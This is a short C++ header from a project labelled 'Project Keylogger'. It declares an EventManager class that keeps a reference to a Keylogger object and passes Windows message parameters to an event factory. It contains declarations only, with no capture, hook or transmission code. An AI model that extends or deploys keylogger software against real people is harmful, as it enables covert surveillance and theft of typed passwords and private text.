/**
 * Project Keylogger
 */


#ifndef _EVENTMANAGER_H
#define _EVENTMANAGER_H

#include "Keylogger.h"

class EventManager {
public: 
    
    /**
     * @param Keylogger&
     */
    EventManager(Keylogger&);
    
    /**
     * Call the Event Factory to create an event depending on parameters. 
     * @param LPARAM
     * @param WPARAM
     */
    void HandleEvent(LPARAM, WPARAM);
private: 
    Keylogger& _keylogger;
};

#endif //_EVENTMANAGER_H